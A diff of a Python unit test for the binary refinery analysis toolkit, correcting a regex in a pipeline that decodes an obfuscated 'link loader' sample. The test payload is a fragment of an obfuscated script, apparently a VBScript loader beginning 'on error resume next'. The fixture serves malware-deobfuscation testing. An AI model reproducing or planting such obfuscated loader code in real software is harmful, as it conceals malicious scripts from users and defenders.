@@ -16,7 +16,7 @@ from refinery.units import Unit
 class TestPipelines(TestUnitBase):
 
     def test_link_loader_tb01(self):
-        pipeline = L('repl Grk ")+chr("') | L(R'rex "chr.(\d+)-(\d+)." "{0},{1},"') | L('pack') | L('sub x:1::2')
+        pipeline = L('repl Grk ")+chr("') | L(R'rex "chr.(\d+)-(\d+)." "{1},{2},"') | L('pack') | L('sub x:1::2')
         payload = (
             B'chr(118-7Grk119-9Grk38-6Grk104-3Grk116-2Grk119-5Grk117-6Grk120-6Grk36-4Grk116-2Grk110-9Grk119-4Grk124-7Grk110-1Grk1'
             B'02-1Grk39-7Grk111-1Grk103-2Grk124-4Grk125-9Grk14-1Grk19-9Grk123-8Grk103-2Grk123-7Grk36-4Grk89-2Grk119-4Grk113-9Grk9'
